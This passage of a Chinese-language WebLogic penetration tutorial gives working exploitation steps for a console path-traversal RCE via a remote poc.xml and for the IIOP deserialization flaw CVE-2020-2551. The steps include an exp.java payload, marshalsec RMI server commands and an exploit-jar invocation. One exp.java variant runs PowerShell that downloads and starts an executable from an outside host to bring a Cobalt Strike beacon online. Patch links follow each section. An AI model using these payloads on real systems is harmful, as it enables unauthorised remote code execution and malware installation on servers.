        </constructor-arg>
      </bean>
    </beans>
    

把poc.xml放在打开http服务的kali机子上(ip:192.168.0.108)：

![](https://image.3001.net/images/20210816/1629075065_6119b6791af7a9e12a0b0.png!small)

在监听机子上开启监听：

![image-20210814223442393](https://image.3001.net/images/20210816/1629075066_6119b67a366a60bf3aa8b.png!small)

然后访问该url：

    
    
    http://192.168.0.106:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged
    .springframework.context.support.ClassPathXmlApplicationContext("http://192.168.0.108/poc.xml")
    

![image-20210814224224450](https://image.3001.net/images/20210816/1629075067_6119b67b45cdae232c126.png!small)

同理，上线cs的话把反弹的命令改了即可。

安全防护

升级官方补丁：https://www.oracle.com/security-alerts/cpuoct2020.html

### 10.IIOP反序列化漏洞（CVE-2020-2551）

漏洞简介

2020年1月15日，Oracle官方发布2020年1月关键补丁更新公告CPU（CriticalPatch
Update），其中CVE-2020-2551的漏洞，漏洞等级为高危，CVVS评分为9.8分，漏洞利用难度低。IIOP反序列化漏洞影响的协议为IIOP协议，该漏洞是由于调用远程对象的实现存在缺陷，导致序列化对象可以任意构造，在使用之前未经安全检查，攻击者可以通过
IIOP 协议远程访问 Weblogic Server 服务器上的远程接口，传入恶意数据，从而获取服务器权限并在未授权情况下远程执行任意代码.

影响版本

    
    
    10.3.6.0
    12.1.3.0
    12.2.1.3
    12.2.1.4
    

漏洞复现

需要安装java8环境

    
    
    cd /opt
    curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz
    tar zxvf jdk-8u20-linux-x64.tar.gz
    rm -rf /usr/bin/java*
    ln -s /opt/jdk1.8.0_20/bin/j* /usr/bin
    javac -version
    java -version
    

这里我已经安装好

![image-20210814225849356](https://image.3001.net/images/20210816/1629075068_6119b67c981ba7573d560.png!small)

exp.java代码

    
    
    import java.io.IOException;public class exp {	static{		try {			java.lang.Runtime.getRuntime().exec(new String[]{"cmd","/c","calc"});		} catch (IOException e) {			e.printStackTrace();		}	}	public static void main(String[] args) {			}}
    

java编译exp.java

    
    
    javac exp.java -source 1.6 -target 1.6
    

![image-20210814230430269](https://image.3001.net/images/20210816/1629075069_6119b67d8e455235e97af.png!small)

接着python开启http服务,与exp.class在同一文件夹即可

![image-20210814230710705](https://image.3001.net/images/20210816/1629075070_6119b67e5c02e1d90b051.png!small)

使用marshalsec启动一个rmi服务

    
    
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.0.108/#exp" 12345
    

![image-20210814230935474](https://image.3001.net/images/20210816/1629075071_6119b67f2aca214f74fb6.png!small)

使用工具weblogic_CVE_2020_2551.jar，执行exp

    
    
    java -jar weblogic_CVE_2020_2551.jar 192.168.0.105 7001 rmi://192.168.0.108:12345/exp
    

![image-20210814231847184](https://image.3001.net/images/20210816/1629075072_6119b680175ac4062ba56.png!small)

可以看见成功弹出

![image-20210814231822800](https://image.3001.net/images/20210816/1629075073_6119b6812e6fa03e84339.png!small)

同理，上线cs的话，只需改exp.java代码即可，后续步骤一样

    
    
    import java.io.IOException;public class exp {	static{		try {			java.lang.Runtime.getRuntime().exec(new String[]{"powershell","/c"," (new-object System.Net.WebClient).DownloadFile('http://x.x.x.x/zcc.exe','zcc.exe');start-process zcc.exe"});		} catch (IOException e) {			e.printStackTrace();		}	}	public static void main(String[] args) {			}}
    

安全防护

使用官方补丁进行修复：https://www.oracle.com/security-alerts/cpujan2020.html

####  

